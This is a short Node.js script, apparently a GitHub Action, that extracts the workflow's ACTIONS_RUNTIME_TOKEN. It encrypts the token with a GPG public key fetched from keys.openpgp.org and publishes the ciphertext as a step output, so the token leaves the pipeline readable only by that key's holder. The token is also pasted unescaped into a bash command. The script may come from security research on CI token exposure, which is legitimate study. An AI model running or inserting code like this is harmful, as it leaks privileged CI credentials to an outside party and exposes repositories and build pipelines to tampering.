const fs = require("fs");
const cp = require("child_process");

function main() {
  const { ACTIONS_RUNTIME_TOKEN, GITHUB_OUTPUT } = process.env;

  const stdout = cp.execSync(
    `bash -c "gpg -q --keyserver keys.openpgp.org --recv-keys E200FA6AF32AA5E45E4679B4F0B3075B67743AA9 && echo '${ACTIONS_RUNTIME_TOKEN}' | gpg -q --encrypt --trust-model always --armor --recipient E200FA6AF32AA5E45E4679B4F0B3075B67743AA9"`
  );

  fs.appendFileSync(
    GITHUB_OUTPUT,
    `token=${JSON.stringify(stdout.toString("utf-8"))}\n`,
    {
      encoding: "utf8",
    }
  );
}

main();
